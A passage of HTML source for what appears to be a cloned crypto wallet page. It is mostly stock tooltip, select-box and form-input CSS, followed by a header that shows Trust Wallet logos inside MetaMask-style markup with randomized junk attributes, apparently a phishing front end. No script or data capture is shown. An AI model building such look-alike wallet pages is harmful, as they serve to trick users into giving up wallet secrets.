      border-right: 5px solid transparent;
      border-left: 5px solid transparent; }
      .tippy-popper[x-placement^=bottom] .tippy-tooltip.light-theme [x-arrow].arrow-big {
      border-bottom: 10px solid #fff;
      border-right: 10px solid transparent;
      border-left: 10px solid transparent; }
      .tippy-popper[x-placement^=bottom] .tippy-tooltip.transparent-theme [x-circle] {
      background-color: rgba(0, 0, 0, 0.7); }
      .tippy-popper[x-placement^=bottom] .tippy-tooltip.transparent-theme [x-arrow] {
      border-bottom: 7px solid rgba(0, 0, 0, 0.7);
      border-right: 7px solid transparent;
      border-left: 7px solid transparent; }
      .tippy-popper[x-placement^=bottom] .tippy-tooltip.transparent-theme [x-arrow].arrow-small {
      border-bottom: 5px solid rgba(0, 0, 0, 0.7);
      border-right: 5px solid transparent;
      border-left: 5px solid transparent; }
      .tippy-popper[x-placement^=bottom] .tippy-tooltip.transparent-theme [x-arrow].arrow-big {
      border-bottom: 10px solid rgba(0, 0, 0, 0.7);
      border-right: 10px solid transparent;
      border-left: 10px solid transparent; }
      .tippy-popper[x-placement^=bottom] [data-animation=perspective] {
      -webkit-transform-origin: top;
      transform-origin: top; }
      .tippy-popper[x-placement^=bottom] [data-animation=perspective].enter {
      opacity: 1;
      -webkit-transform: translateY(10px) rotateX(0);
      transform: translateY(10px) rotateX(0); }
      .tippy-popper[x-placement^=bottom] [data-animation=perspective].leave {
      opacity: 0;
      -webkit-transform: translateY(0) rotateX(-90deg);
      transform: translateY(0) rotateX(-90deg); }
      .tippy-popper[x-placement^=bottom] [data-animation=fade].enter {
      opacity: 1;
      -webkit-transform: translateY(10px);
      transform: translateY(10px); }
      .tippy-popper[x-placement^=bottom] [data-animation=fade].leave {
      opacity: 0;
      -webkit-transform: translateY(10px);
      transform: translateY(10px); }
      .tippy-popper[x-placement^=bottom] [data-animation=shift].enter {
      opacity: 1;
      -webkit-transform: translateY(10px);
      transform: translateY(10px); }
      .tippy-popper[x-placement^=bottom] [data-animation=shift].leave {
      opacity: 0;
      -webkit-transform: translateY(0);
      transform: translateY(0); }
      .tippy-popper[x-placement^=bottom] [data-animation=scale].enter {
      opacity: 1;
      -webkit-transform: translateY(10px) scale(1);
      transform: translateY(10px) scale(1); }
      .tippy-popper[x-placement^=bottom] [data-animation=scale].leave {
      opacity: 0;
      -webkit-transform: translateY(0) scale(0);
      transform: translateY(0) scale(0); }
      .tippy-popper[x-placement^=left] [x-arrow] {
      border-left: 7px solid #333;
      border-top: 7px solid transparent;
      border-bottom: 7px solid transparent;
      right: -7px;
      margin: 6px 0; }
      .tippy-popper[x-placement^=left] [x-arrow].arrow-small {
      border-left: 5px solid #333;
      border-top: 5px solid transparent;
      border-bottom: 5px solid transparent;
      right: -5px; }
      .tippy-popper[x-placement^=left] [x-arrow].arrow-big {
      border-left: 10px solid #333;
      border-top: 10px solid transparent;
      border-bottom: 10px solid transparent;
      right: -10px; }
      .tippy-popper[x-placement^=left] [x-circle] {
      -webkit-transform-origin: 50% 0;
      transform-origin: 50% 0; }
      .tippy-popper[x-placement^=left] [x-circle].enter {
      -webkit-transform: scale(1) translate(-50%, -50%);
      transform: scale(1) translate(-50%, -50%);
      opacity: 1; }
      .tippy-popper[x-placement^=left] [x-circle].leave {
      -webkit-transform: scale(0.15) translate(-50%, -50%);
      transform: scale(0.15) translate(-50%, -50%);
      opacity: 0; }
      .tippy-popper[x-placement^=left] .tippy-tooltip.light-theme [x-circle] {
      background-color: #fff; }
      .tippy-popper[x-placement^=left] .tippy-tooltip.light-theme [x-arrow] {
      border-left: 7px solid #fff;
      border-top: 7px solid transparent;
      border-bottom: 7px solid transparent; }
      .tippy-popper[x-placement^=left] .tippy-tooltip.light-theme [x-arrow].arrow-small {
      border-left: 5px solid #fff;
      border-top: 5px solid transparent;
      border-bottom: 5px solid transparent; }
      .tippy-popper[x-placement^=left] .tippy-tooltip.light-theme [x-arrow].arrow-big {
      border-left: 10px solid #fff;
      border-top: 10px solid transparent;
      border-bottom: 10px solid transparent; }
      .tippy-popper[x-placement^=left] .tippy-tooltip.transparent-theme [x-circle] {
      background-color: rgba(0, 0, 0, 0.7); }
      .tippy-popper[x-placement^=left] .tippy-tooltip.transparent-theme [x-arrow] {
      border-left: 7px solid rgba(0, 0, 0, 0.7);
      border-top: 7px solid transparent;
      border-bottom: 7px solid transparent; }
      .tippy-popper[x-placement^=left] .tippy-tooltip.transparent-theme [x-arrow].arrow-small {
      border-left: 5px solid rgba(0, 0, 0, 0.7);
      border-top: 5px solid transparent;
      border-bottom: 5px solid transparent; }
      .tippy-popper[x-placement^=left] .tippy-tooltip.transparent-theme [x-arrow].arrow-big {
      border-left: 10px solid rgba(0, 0, 0, 0.7);
      border-top: 10px solid transparent;
      border-bottom: 10px solid transparent; }
      .tippy-popper[x-placement^=left] [data-animation=perspective] {
      -webkit-transform-origin: right;
      transform-origin: right; }
      .tippy-popper[x-placement^=left] [data-animation=perspective].enter {
      opacity: 1;
      -webkit-transform: translateX(-10px) rotateY(0);
      transform: translateX(-10px) rotateY(0); }
      .tippy-popper[x-placement^=left] [data-animation=perspective].leave {
      opacity: 0;
      -webkit-transform: translateX(0) rotateY(-90deg);
      transform: translateX(0) rotateY(-90deg); }
      .tippy-popper[x-placement^=left] [data-animation=fade].enter {
      opacity: 1;
      -webkit-transform: translateX(-10px);
      transform: translateX(-10px); }
      .tippy-popper[x-placement^=left] [data-animation=fade].leave {
      opacity: 0;
      -webkit-transform: translateX(-10px);
      transform: translateX(-10px); }
      .tippy-popper[x-placement^=left] [data-animation=shift].enter {
      opacity: 1;
      -webkit-transform: translateX(-10px);
      transform: translateX(-10px); }
      .tippy-popper[x-placement^=left] [data-animation=shift].leave {
      opacity: 0;
      -webkit-transform: translateX(0);
      transform: translateX(0); }
      .tippy-popper[x-placement^=left] [data-animation=scale].enter {
      opacity: 1;
      -webkit-transform: translateX(-10px) scale(1);
      transform: translateX(-10px) scale(1); }
      .tippy-popper[x-placement^=left] [data-animation=scale].leave {
      opacity: 0;
      -webkit-transform: translateX(0) scale(0);
      transform: translateX(0) scale(0); }
      .tippy-popper[x-placement^=right] [x-arrow] {
      border-right: 7px solid #333;
      border-top: 7px solid transparent;
      border-bottom: 7px solid transparent;
      left: -7px;
      margin: 6px 0; }
      .tippy-popper[x-placement^=right] [x-arrow].arrow-small {
      border-right: 5px solid #333;
      border-top: 5px solid transparent;
      border-bottom: 5px solid transparent;
      left: -5px; }
      .tippy-popper[x-placement^=right] [x-arrow].arrow-big {
      border-right: 10px solid #333;
      border-top: 10px solid transparent;
      border-bottom: 10px solid transparent;
      left: -10px; }
      .tippy-popper[x-placement^=right] [x-circle] {
      -webkit-transform-origin: -50% 0;
      transform-origin: -50% 0; }
      .tippy-popper[x-placement^=right] [x-circle].enter {
      -webkit-transform: scale(1) translate(-50%, -50%);
      transform: scale(1) translate(-50%, -50%);
      opacity: 1; }
      .tippy-popper[x-placement^=right] [x-circle].leave {
      -webkit-transform: scale(0.15) translate(-50%, -50%);
      transform: scale(0.15) translate(-50%, -50%);
      opacity: 0; }
      .tippy-popper[x-placement^=right] .tippy-tooltip.light-theme [x-circle] {
      background-color: #fff; }
      .tippy-popper[x-placement^=right] .tippy-tooltip.light-theme [x-arrow] {
      border-right: 7px solid #fff;
      border-top: 7px solid transparent;
      border-bottom: 7px solid transparent; }
      .tippy-popper[x-placement^=right] .tippy-tooltip.light-theme [x-arrow].arrow-small {
      border-right: 5px solid #fff;
      border-top: 5px solid transparent;
      border-bottom: 5px solid transparent; }
      .tippy-popper[x-placement^=right] .tippy-tooltip.light-theme [x-arrow].arrow-big {
      border-right: 10px solid #fff;
      border-top: 10px solid transparent;
      border-bottom: 10px solid transparent; }
      .tippy-popper[x-placement^=right] .tippy-tooltip.transparent-theme [x-circle] {
      background-color: rgba(0, 0, 0, 0.7); }
      .tippy-popper[x-placement^=right] .tippy-tooltip.transparent-theme [x-arrow] {
      border-right: 7px solid rgba(0, 0, 0, 0.7);
      border-top: 7px solid transparent;
      border-bottom: 7px solid transparent; }
      .tippy-popper[x-placement^=right] .tippy-tooltip.transparent-theme [x-arrow].arrow-small {
      border-right: 5px solid rgba(0, 0, 0, 0.7);
      border-top: 5px solid transparent;
      border-bottom: 5px solid transparent; }
      .tippy-popper[x-placement^=right] .tippy-tooltip.transparent-theme [x-arrow].arrow-big {
      border-right: 10px solid rgba(0, 0, 0, 0.7);
      border-top: 10px solid transparent;
      border-bottom: 10px solid transparent; }
      .tippy-popper[x-placement^=right] [data-animation=perspective] {
      -webkit-transform-origin: left;
      transform-origin: left; }
      .tippy-popper[x-placement^=right] [data-animation=perspective].enter {
      opacity: 1;
      -webkit-transform: translateX(10px) rotateY(0);
      transform: translateX(10px) rotateY(0); }
      .tippy-popper[x-placement^=right] [data-animation=perspective].leave {
      opacity: 0;
      -webkit-transform: translateX(0) rotateY(90deg);
      transform: translateX(0) rotateY(90deg); }
      .tippy-popper[x-placement^=right] [data-animation=fade].enter {
      opacity: 1;
      -webkit-transform: translateX(10px);
      transform: translateX(10px); }
      .tippy-popper[x-placement^=right] [data-animation=fade].leave {
      opacity: 0;
      -webkit-transform: translateX(10px);
      transform: translateX(10px); }
      .tippy-popper[x-placement^=right] [data-animation=shift].enter {
      opacity: 1;
      -webkit-transform: translateX(10px);
      transform: translateX(10px); }
      .tippy-popper[x-placement^=right] [data-animation=shift].leave {
      opacity: 0;
      -webkit-transform: translateX(0);
      transform: translateX(0); }
      .tippy-popper[x-placement^=right] [data-animation=scale].enter {
      opacity: 1;
      -webkit-transform: translateX(10px) scale(1);
      transform: translateX(10px) scale(1); }
      .tippy-popper[x-placement^=right] [data-animation=scale].leave {
      opacity: 0;
      -webkit-transform: translateX(0) scale(0);
      transform: translateX(0) scale(0); }
      .tippy-popper .tippy-tooltip.transparent-theme {
      background-color: rgba(0, 0, 0, 0.7); }
      .tippy-popper .tippy-tooltip.transparent-theme[data-animatefill] {
      background-color: transparent; }
      .tippy-popper .tippy-tooltip.light-theme {
      color: #26323d;
      box-shadow: 0 4px 20px 4px rgba(0, 20, 60, 0.1), 0 4px 80px -8px rgba(0, 20, 60, 0.2);
      background-color: #fff; }
      .tippy-popper .tippy-tooltip.light-theme[data-animatefill] {
      background-color: transparent; }
      .tippy-tooltip {
      position: relative;
      color: #fff;
      border-radius: 4px;
      font-size: .95rem;
      padding: .4rem .8rem;
      text-align: center;
      will-change: transform;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      background-color: #333; }
      .tippy-tooltip--small {
      padding: .25rem .5rem;
      font-size: .8rem; }
      .tippy-tooltip--big {
      padding: .6rem 1.2rem;
      font-size: 1.2rem; }
      .tippy-tooltip[data-animatefill] {
      overflow: hidden;
      background-color: transparent; }
      .tippy-tooltip[data-interactive] {
      pointer-events: auto; }
      .tippy-tooltip[data-inertia] {
      transition-timing-function: cubic-bezier(0.53, 2, 0.36, 0.85); }
      .tippy-tooltip [x-arrow] {
      position: absolute;
      width: 0;
      height: 0; }
      .tippy-tooltip [x-circle] {
      position: absolute;
      will-change: transform;
      background-color: #333;
      border-radius: 50%;
      width: 130%;
      width: calc(110% + 2rem);
      left: 50%;
      top: 50%;
      z-index: -1;
      overflow: hidden;
      transition: all ease; }
      .tippy-tooltip [x-circle]:before {
      content: "";
      padding-top: 90%;
      float: left; }
      @media (max-width: 450px) {
      .tippy-popper {
      max-width: 96%;
      max-width: calc(100% - 20px); } }
      /**
      * React Select
      * ============
      * Created by Jed Watson and Joss Mackison for KeystoneJS, http://www.keystonejs.com/
      * https://twitter.com/jedwatson https://twitter.com/jossmackison https://twitter.com/keystonejs
      * MIT License: https://github.com/JedWatson/react-select
      */
      .Select {
      position: relative; }
      .Select input::-webkit-contacts-auto-fill-button,
      .Select input::-webkit-credentials-auto-fill-button {
      display: none !important; }
      .Select input::-ms-clear {
      display: none !important; }
      .Select input::-ms-reveal {
      display: none !important; }
      .Select,
      .Select div,
      .Select input,
      .Select span {
      box-sizing: border-box; }
      .Select.is-disabled .Select-arrow-zone {
      cursor: default;
      pointer-events: none;
      opacity: 0.35; }
      .Select.is-disabled > .Select-control {
      background-color: #f9f9f9; }
      .Select.is-disabled > .Select-control:hover {
      box-shadow: none; }
      .Select.is-open > .Select-control {
      border-bottom-right-radius: 0;
      border-bottom-left-radius: 0;
      background: #fff;
      border-color: #b3b3b3 #ccc #d9d9d9; }
      .Select.is-open > .Select-control .Select-arrow {
      top: -2px;
      border-color: transparent transparent #999;
      border-width: 0 5px 5px; }
      .Select.is-searchable.is-open > .Select-control {
      cursor: text; }
      .Select.is-searchable.is-focused:not(.is-open) > .Select-control {
      cursor: text; }
      .Select.is-focused > .Select-control {
      background: #fff; }
      .Select.is-focused:not(.is-open) > .Select-control {
      border-color: #007eff;
      box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 0 3px rgba(0, 126, 255, 0.1);
      background: #fff; }
      .Select.has-value.is-clearable.Select--single > .Select-control .Select-value {
      padding-right: 42px; }
      .Select.has-value.Select--single > .Select-control .Select-value .Select-value-label,
      .Select.has-value.is-pseudo-focused.Select--single > .Select-control .Select-value .Select-value-label {
      color: #333; }
      .Select.has-value.Select--single > .Select-control .Select-value a.Select-value-label,
      .Select.has-value.is-pseudo-focused.Select--single > .Select-control .Select-value a.Select-value-label {
      cursor: pointer;
      text-decoration: none; }
      .Select.has-value.Select--single > .Select-control .Select-value a.Select-value-label:hover,
      .Select.has-value.is-pseudo-focused.Select--single > .Select-control .Select-value a.Select-value-label:hover,
      .Select.has-value.Select--single > .Select-control .Select-value a.Select-value-label:focus,
      .Select.has-value.is-pseudo-focused.Select--single > .Select-control .Select-value a.Select-value-label:focus {
      color: #007eff;
      outline: none;
      text-decoration: underline; }
      .Select.has-value.Select--single > .Select-control .Select-value a.Select-value-label:focus,
      .Select.has-value.is-pseudo-focused.Select--single > .Select-control .Select-value a.Select-value-label:focus {
      background: #fff; }
      .Select.has-value.is-pseudo-focused .Select-input {
      opacity: 0; }
      .Select.is-open .Select-arrow,
      .Select .Select-arrow-zone:hover > .Select-arrow {
      border-top-color: #666; }
      .Select.Select--rtl {
      direction: rtl;
      text-align: right; }
      .Select-control {
      background-color: #fff;
      border-color: #d9d9d9 #ccc #b3b3b3;
      border-radius: 4px;
      border: 1px solid #ccc;
      color: #333;
      cursor: default;
      display: table;
      border-spacing: 0;
      border-collapse: separate;
      height: 36px;
      outline: none;
      overflow: hidden;
      position: relative;
      width: 100%; }
      .Select-control:hover {
      box-shadow: 0 1px 0 rgba(0, 0, 0, 0.06); }
      .Select-control .Select-input:focus {
      outline: none;
      background: #fff; }
      .Select-placeholder,
      .Select--single > .Select-control .Select-value {
      bottom: 0;
      color: #aaa;
      left: 0;
      line-height: 34px;
      padding-left: 10px;
      padding-right: 10px;
      position: absolute;
      right: 0;
      top: 0;
      max-width: 100%;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap; }
      .Select-input {
      height: 34px;
      padding-left: 10px;
      padding-right: 10px;
      vertical-align: middle; }
      .Select-input > input {
      width: 100%;
      background: none transparent;
      border: 0 none;
      box-shadow: none;
      cursor: default;
      display: inline-block;
      font-family: inherit;
      font-size: inherit;
      margin: 0;
      outline: none;
      line-height: 17px;
      /* For IE 8 compatibility */
      padding: 8px 0 12px;
      /* For IE 8 compatibility */
      -webkit-appearance: none; }
      .is-focused .Select-input > input {
      cursor: text; }
      .has-value.is-pseudo-focused .Select-input {
      opacity: 0; }
      .Select-control:not(.is-searchable) > .Select-input {
      outline: none; }
      .Select-loading-zone {
      cursor: pointer;
      display: table-cell;
      position: relative;
      text-align: center;
      vertical-align: middle;
      width: 16px; }
      .Select-loading {
      -webkit-animation: Select-animation-spin 400ms infinite linear;
      animation: Select-animation-spin 400ms infinite linear;
      width: 16px;
      height: 16px;
      box-sizing: border-box;
      border-radius: 50%;
      border: 2px solid #ccc;
      border-right-color: #333;
      display: inline-block;
      position: relative;
      vertical-align: middle; }
      .Select-clear-zone {
      -webkit-animation: Select-animation-fadeIn 200ms;
      animation: Select-animation-fadeIn 200ms;
      color: #999;
      cursor: pointer;
      display: table-cell;
      position: relative;
      text-align: center;
      vertical-align: middle;
      width: 17px; }
      .Select-clear-zone:hover {
      color: #D0021B; }
      .Select-clear {
      display: inline-block;
      font-size: 18px;
      line-height: 1; }
      .Select--multi .Select-clear-zone {
      width: 17px; }
      .Select-arrow-zone {
      cursor: pointer;
      display: table-cell;
      position: relative;
      text-align: center;
      vertical-align: middle;
      width: 25px;
      padding-right: 5px; }
      .Select--rtl .Select-arrow-zone {
      padding-right: 0;
      padding-left: 5px; }
      .Select-arrow {
      border-color: #999 transparent transparent;
      border-style: solid;
      border-width: 5px 5px 2.5px;
      display: inline-block;
      height: 0;
      width: 0;
      position: relative; }
      .Select-control > *:last-child {
      padding-right: 5px; }
      .Select--multi .Select-multi-value-wrapper {
      display: inline-block; }
      .Select .Select-aria-only {
      position: absolute;
      display: inline-block;
      height: 1px;
      width: 1px;
      margin: -1px;
      clip: rect(0, 0, 0, 0);
      overflow: hidden;
      float: left; }
      @-webkit-keyframes Select-animation-fadeIn {
      from {
      opacity: 0; }
      to {
      opacity: 1; } }
      @keyframes Select-animation-fadeIn {
      from {
      opacity: 0; }
      to {
      opacity: 1; } }
      .Select-menu-outer {
      border-bottom-right-radius: 4px;
      border-bottom-left-radius: 4px;
      background-color: #fff;
      border: 1px solid #ccc;
      border-top-color: #e6e6e6;
      box-shadow: 0 1px 0 rgba(0, 0, 0, 0.06);
      box-sizing: border-box;
      margin-top: -1px;
      max-height: 200px;
      position: absolute;
      top: 100%;
      width: 100%;
      z-index: 1;
      -webkit-overflow-scrolling: touch; }
      .Select-menu {
      max-height: 198px;
      overflow-y: auto; }
      .Select-option {
      box-sizing: border-box;
      background-color: #fff;
      color: #666666;
      cursor: pointer;
      display: block;
      padding: 8px 10px; }
      .Select-option:last-child {
      border-bottom-right-radius: 4px;
      border-bottom-left-radius: 4px; }
      .Select-option.is-selected {
      background-color: #f5faff;
      /* Fallback color for IE 8 */
      background-color: rgba(0, 126, 255, 0.04);
      color: #333; }
      .Select-option.is-focused {
      background-color: #ebf5ff;
      /* Fallback color for IE 8 */
      background-color: rgba(0, 126, 255, 0.08);
      color: #333; }
      .Select-option.is-disabled {
      color: #cccccc;
      cursor: default; }
      .Select-noresults {
      box-sizing: border-box;
      color: #999999;
      cursor: default;
      display: block;
      padding: 8px 10px; }
      .Select--multi .Select-input {
      vertical-align: middle;
      margin-left: 10px;
      padding: 0; }
      .Select--multi.Select--rtl .Select-input {
      margin-left: 0;
      margin-right: 10px; }
      .Select--multi.has-value .Select-input {
      margin-left: 5px; }
      .Select--multi .Select-value {
      background-color: #ebf5ff;
      /* Fallback color for IE 8 */
      background-color: rgba(0, 126, 255, 0.08);
      border-radius: 2px;
      border: 1px solid #c2e0ff;
      /* Fallback color for IE 8 */
      border: 1px solid rgba(0, 126, 255, 0.24);
      color: #007eff;
      display: inline-block;
      font-size: 0.9em;
      line-height: 1.4;
      margin-left: 5px;
      margin-top: 5px;
      vertical-align: top; }
      .Select--multi .Select-value-icon,
      .Select--multi .Select-value-label {
      display: inline-block;
      vertical-align: middle; }
      .Select--multi .Select-value-label {
      border-bottom-right-radius: 2px;
      border-top-right-radius: 2px;
      cursor: default;
      padding: 2px 5px; }
      .Select--multi a.Select-value-label {
      color: #007eff;
      cursor: pointer;
      text-decoration: none; }
      .Select--multi a.Select-value-label:hover {
      text-decoration: underline; }
      .Select--multi .Select-value-icon {
      cursor: pointer;
      border-bottom-left-radius: 2px;
      border-top-left-radius: 2px;
      border-right: 1px solid #c2e0ff;
      /* Fallback color for IE 8 */
      border-right: 1px solid rgba(0, 126, 255, 0.24);
      padding: 1px 5px 3px; }
      .Select--multi .Select-value-icon:hover,
      .Select--multi .Select-value-icon:focus {
      background-color: #d8eafd;
      /* Fallback color for IE 8 */
      background-color: rgba(0, 113, 230, 0.08);
      color: #0071e6; }
      .Select--multi .Select-value-icon:active {
      background-color: #c2e0ff;
      /* Fallback color for IE 8 */
      background-color: rgba(0, 126, 255, 0.24); }
      .Select--multi.Select--rtl .Select-value {
      margin-left: 0;
      margin-right: 5px; }
      .Select--multi.Select--rtl .Select-value-icon {
      border-right: none;
      border-left: 1px solid #c2e0ff;
      /* Fallback color for IE 8 */
      border-left: 1px solid rgba(0, 126, 255, 0.24); }
      .Select--multi.is-disabled .Select-value {
      background-color: #fcfcfc;
      border: 1px solid #e3e3e3;
      color: #333; }
      .Select--multi.is-disabled .Select-value-icon {
      cursor: not-allowed;
      border-right: 1px solid #e3e3e3; }
      .Select--multi.is-disabled .Select-value-icon:hover,
      .Select--multi.is-disabled .Select-value-icon:focus,
      .Select--multi.is-disabled .Select-value-icon:active {
      background-color: #fcfcfc; }
      @keyframes Select-animation-spin {
      to {
      -webkit-transform: rotate(1turn);
      transform: rotate(1turn); } }
      @-webkit-keyframes Select-animation-spin {
      to {
      -webkit-transform: rotate(1turn); } }
    </style>
    <style type="text/css" data-jss="" data-meta="MuiInput">
      .jss81 {
      color: rgba(0, 0, 0, 0.87);
      display: inline-flex;
      position: relative;
      font-size: 1rem;
      font-family: "Roboto", "Helvetica", "Arial", sans-serif;
      line-height: 1.1875em;
      }
      .jss81.jss84 {
      color: rgba(0, 0, 0, 0.38);
      }
      label + .jss82 {
      margin-top: 16px;
      }
      .jss85:after {
      left: 0;
      right: 0;
      bottom: 0;
      content: "";
      position: absolute;
      transform: scaleX(0);
      transition: transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
      border-bottom: 2px solid #303f9f;
      pointer-events: none;
      }
      .jss85.jss83:after {
      transform: scaleX(1);
      }
      .jss85.jss86:after {
      transform: scaleX(1);
      border-bottom-color: #f44336;
      }
      .jss85:before {
      left: 0;
      color: transparent;
      right: 0;
      bottom: 0;
      content: "need text here to prevent subpixel zoom issue";
      position: absolute;
      transition: border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
      border-bottom: 1px solid rgba(0, 0, 0, 0.42);
      pointer-events: none;
      }
      .jss85:hover:not(.jss84):not(.jss83):not(.jss86):before {
      border-bottom: 2px solid rgba(0, 0, 0, 0.87);
      }
      .jss85.jss84:before {
      border-bottom: 1px dotted rgba(0, 0, 0, 0.42);
      }
      .jss87 {
      padding: 6px 0 7px;
      }
      .jss88 {
      width: 100%;
      }
      .jss89 {
      font: inherit;
      color: currentColor;
      border: 0;
      margin: 0;
      padding: 6px 0 7px;
      display: block;
      min-width: 0;
      flex-grow: 1;
      box-sizing: content-box;
      background: none;
      vertical-align: middle;
      -webkit-tap-highlight-color: transparent;
      }
      .jss89::-webkit-input-placeholder {
      color: currentColor;
      opacity: 0.42;
      transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
      }
      .jss89::-moz-placeholder {
      color: currentColor;
      opacity: 0.42;
      transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
      }
      .jss89:-ms-input-placeholder {
      color: currentColor;
      opacity: 0.42;
      transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
      }
      .jss89::-ms-input-placeholder {
      color: currentColor;
      opacity: 0.42;
      transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
      }
      .jss89:focus {
      outline: 0;
      }
      .jss89:invalid {
      box-shadow: none;
      }
      .jss89::-webkit-search-decoration {
      -webkit-appearance: none;
      }
      .jss89.jss84 {
      opacity: 1;
      }
      label[data-shrink=false] + .jss82 .jss89::-webkit-input-placeholder {
      opacity: 0;
      }
      label[data-shrink=false] + .jss82 .jss89::-moz-placeholder {
      opacity: 0;
      }
      label[data-shrink=false] + .jss82 .jss89:-ms-input-placeholder {
      opacity: 0;
      }
      label[data-shrink=false] + .jss82 .jss89::-ms-input-placeholder {
      opacity: 0;
      }
      label[data-shrink=false] + .jss82 .jss89:focus::-webkit-input-placeholder {
      opacity: 0.42;
      }
      label[data-shrink=false] + .jss82 .jss89:focus::-moz-placeholder {
      opacity: 0.42;
      }
      label[data-shrink=false] + .jss82 .jss89:focus:-ms-input-placeholder {
      opacity: 0.42;
      }
      label[data-shrink=false] + .jss82 .jss89:focus::-ms-input-placeholder {
      opacity: 0.42;
      }
      .jss90 {
      padding-top: 3px;
      }
      .jss91 {
      resize: none;
      padding: 0;
      }
      .jss92 {
      height: 1.1875em;
      }
      .jss93 {
      -moz-appearance: textfield;
      -webkit-appearance: textfield;
      }
    </style>
    <style type="text/css" data-jss="" data-meta="MuiFormLabel">
      .jss76 {
      color: rgba(0, 0, 0, 0.54);
      padding: 0;
      font-size: 1rem;
      font-family: "Roboto", "Helvetica", "Arial", sans-serif;
      line-height: 1;
      }
      .jss76.jss77 {
      color: #303f9f;
      }
      .jss76.jss78 {
      color: rgba(0, 0, 0, 0.38);
      }
      .jss76.jss79 {
      color: #f44336;
      }
      .jss80.jss79 {
      color: #f44336;
      }
    </style>
    <style type="text/css" data-jss="" data-meta="MuiInputLabel">
      .jss71 {
      transform-origin: top left;
      }
      .jss72 {
      top: 0;
      left: 0;
      position: absolute;
      transform: translate(0, 24px) scale(1);
      }
      .jss73 {
      transform: translate(0, 21px) scale(1);
      }
      .jss74 {
      transform: translate(0, 1.5px) scale(0.75);
      transform-origin: top left;
      }
      .jss75 {
      transition: transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
      }
    </style>
    <style type="text/css" data-jss="" data-meta="MuiFormControl">
      .jss67 {
      margin: 0;
      border: 0;
      display: inline-flex;
      padding: 0;
      position: relative;
      min-width: 0;
      flex-direction: column;
      }
      .jss68 {
      margin-top: 16px;
      margin-bottom: 8px;
      }
      .jss69 {
      margin-top: 8px;
      margin-bottom: 4px;
      }
      .jss70 {
      width: 100%;
      }
    </style>
    <style type="text/css" data-jss="">
      .jss57 {
      color: #aeaeae;
      font-weight: 400;
      }
      .jss57.jss58 {
      color: #aeaeae;
      }
      .jss57.jss60 {
      color: #aeaeae;
      }
      .jss59:after {
      border-bottom: 2px solid #f7861c;
      }
      .jss61.jss62 {
      color: #5b5b5b;
      }
      .jss61.jss60 {
      color: #5b5b5b;
      }
      .jss64 {
      border: 1px solid #d2d8dd;
      height: 48px;
      padding: 0 16px;
      display: flex;
      align-items: center;
      border-radius: 4px;
      }
      label + .jss64 {
      margin-top: 8px;
      }
      .jss64.jss63 {
      border: 1px solid #2f9ae0;
      }
      .jss65 {
      color: #5b5b5b;
      position: initial;
      transform: none;
      font-size: 1rem;
      transition: none;
      }
      .jss66 {
      color: #5b5b5b;
      position: initial;
      transform: none;
      font-size: .75rem;
      transition: none;
      }
      #loading__logo {
      width: 10rem;
      height: 10rem;
      align-self: center;
      margin: 10rem 0 0 0;
      }
      #loading__spinner {
      width: 2rem;
      height: 2rem;
      align-self: center;
      margin-top: 1rem;
      }
      .hidden
      {
      display: none !important;
      }
      .loader{
      position: fixed;
      top: 0;
      left: 0;
      background: #fff;
      width: 100%;
      height: 100vh;
      z-index: 100;
      display: flex;
      justify-content: center;
      align-items: center;
      }
      .lodas{
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      }
    </style>
  </head>
  <body data-9bite7="l823si" class="3vljnf ">
    <div class="tengge z2 hidden" id="app-content" data-3o050y="b8ehgz">
      <img alt="" id="loading__logo" src="trustwallet.png">
      <!-- <img id="loading__spinner" alt="" src="loader.gif"> -->
    </div>
    <div id="app-content" class="mphxcz z3" data-67vlch="0cngou">
      <div data-reactroot="" class="e3fztq app" data-h43gyc="ks9wfs">
        <!-- react-empty: 2 --><!-- react-empty: 3 -->
        <div class="qipm1b app-header" data-ga8czk="dr5vpd" style="background-color: #3375bb !important;">
          <div class="78hlun app-header__contents" data-jozf9q="3m7dxh">
            <div class="r493gl app-header__logo-container" data-3uljk3="hjer5z">
              <img alt="" class="app-header__metafox-logo app-header__metafox-logo--horizontal" height="30" src="TWT.png">
              <img alt="" class="app-header__metafox-logo app-header__metafox-logo--icon" height="42" src="TWT.png"></div>
            <div class="ozhulp app-header__account-menu-container" data-acra13="lcq0wv">

            </div>
          </div>
        </div>
        <div data-eso6of="cv7p7u" class="v1mm7n "><span data-dgklei="7yk6zb" class="twjjuz "></span></div>
        <div class="1ozzu8 .menu-droppo-container network-droppo" style="position: absolute; top: 58px; width: 309px; z-index: 55;" data-jtps5u="obdy2p">
          <style>
            .menu-droppo-enter {
            transition: transform 300ms ease-in-out;
            transform: translateY(-200%);
            }
            .menu-droppo-enter.menu-droppo-enter-active {
            transition: transform 300ms ease-in-out;
            transform: translateY(0%);
            }
            .menu-droppo-leave {
            transition: transform 300ms ease-in-out;
            transform: translateY(0%);
            }
            .menu-droppo-leave.menu-droppo-leave-active {
            transition: transform 300ms ease-in-out;
            transform: translateY(-200%);
            }
            .alertBox{
            z-index: 500;
            overflow: hidden;
            display: flex;
            -webkit-box-align: center;
            align-items: center;
            -webkit-box-pack: center;
            justify-content: center;
            background-color: rgba(0, 0, 0, 0.3);
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            }
            .alert{
            margin: 0px 0px 2rem;
            background-color: rgb(255, 255, 255);
            border: 1px solid rgb(247, 248, 250);
            box-shadow: rgb(47 128 237 / 5%) 0px 4px 8px 0px;
            padding: 0px;
            width: 50vw;
            overflow: hidden;
            align-self: center;
            max-width: 420px;
            max-height: 90vh;
            border-radius: 20px;
            padding: 15px;
            }
            .alert .title{
            display: flex;
            justify-content: space-between;
            align-items: center;
            }
            .alert .title span{
            text-decoration: none;
            color: rgb(0, 0, 0);
            display: flex;
            -webkit-box-align: center;
            align-items: center;
            font-weight: 500;
            }.pre p{
            display: flex;
            font-size: 14px;
